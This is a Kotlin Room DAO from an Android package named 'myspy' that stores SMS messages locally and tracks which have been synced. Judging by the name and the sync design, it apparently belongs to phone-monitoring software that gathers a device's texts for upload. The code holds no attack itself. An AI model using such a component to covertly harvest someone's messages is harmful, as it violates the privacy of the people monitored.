package com.myspy.android.data.local.db.dao

import androidx.room.*
import com.myspy.android.data.local.db.entities.SmsEntity

/**
 * SMS DAO
 * @author Michael KOJDL
 */
@Dao
interface SmsDao {
    @Query("SELECT * FROM sms_messages WHERE synced = 0 ORDER BY timestamp DESC LIMIT :limit")
    suspend fun getUnsyncedMessages(limit: Int = 100): List<SmsEntity>

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insert(sms: SmsEntity): Long

    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertAll(smsList: List<SmsEntity>)

    @Query("UPDATE sms_messages SET synced = 1 WHERE id IN (:ids)")
    suspend fun markAsSynced(ids: List<Long>)

    @Query("DELETE FROM sms_messages WHERE synced = 1 AND createdAt < :timestamp")
    suspend fun deleteOldSynced(timestamp: Long)

    @Query("SELECT COUNT(*) FROM sms_messages WHERE synced = 0")
    suspend fun getUnsyncedCount(): Int
}
